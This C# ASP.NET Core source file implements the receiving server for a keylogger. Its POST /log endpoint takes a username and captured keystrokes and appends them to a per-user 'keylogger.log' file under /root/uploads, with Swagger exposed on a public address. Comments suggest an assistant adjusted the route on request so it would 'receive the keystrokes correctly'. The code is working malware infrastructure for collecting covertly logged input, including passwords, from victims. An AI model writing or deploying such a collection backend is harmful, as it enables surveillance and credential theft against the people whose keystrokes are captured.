using Microsoft.AspNetCore.Builder;
using Microsoft.AspNetCore.Hosting;
using Microsoft.Extensions.DependencyInjection;
using Microsoft.Extensions.Hosting;
using Microsoft.AspNetCore.Http;
using System.IO;
using System.Threading.Tasks;

using System.Collections.Concurrent;
using System.Threading;
using System.Runtime.InteropServices;

var builder = WebApplication.CreateBuilder(args);

builder.Services.AddEndpointsApiExplorer();
builder.Services.AddSwaggerGen();

var app = builder.Build();

// Semaphore dictionary to handle concurrent writes per user
var locks = new ConcurrentDictionary<string, SemaphoreSlim>();

// Always enable Swagger for this analysis/debug phase, 
// or you can keep it as is if you prefer it only in Development.
// Since you want to access it from public IP, usually it's better to control it via environment.
app.UseSwagger();
app.UseSwaggerUI();

app.UseRouting();

// Update this route to receive the keystrokes correctly
app.MapPost("/log", async (HttpRequest request) =>
{
    var username = request.Query["username"].ToString();
    if (string.IsNullOrWhiteSpace(username))
    {
        return Results.BadRequest("Username is required.");
    }

    using var reader = new StreamReader(request.Body);
    var content = await reader.ReadToEndAsync();

    if (string.IsNullOrEmpty(content))
    {
        return Results.BadRequest("No content.");
    }

    // Sanitize username to prevent directory traversal
    var safeUsername = Path.GetFileName(username);

    // Detect if we are running on Windows or Linux to set the base path accordingly
    var isWindows = RuntimeInformation.IsOSPlatform(OSPlatform.Windows);
    var baseUploadPath = isWindows ? "C:\\root\\uploads" : "/root/uploads";
    
    var userUploadPath = Path.Combine(baseUploadPath, safeUsername);
    Directory.CreateDirectory(userUploadPath);
 
    var filePath = Path.Combine(userUploadPath, "keylogger.log");

    // Get or create a semaphore for this specific user's log file
    var userLock = locks.GetOrAdd(safeUsername, _ => new SemaphoreSlim(1, 1));
    await userLock.WaitAsync();
    try
    {
        // Append the keystrokes to the file
        await File.AppendAllTextAsync(filePath, content);
    }
    finally
    {
        userLock.Release();
    }

    return Results.Ok();
});

app.Run();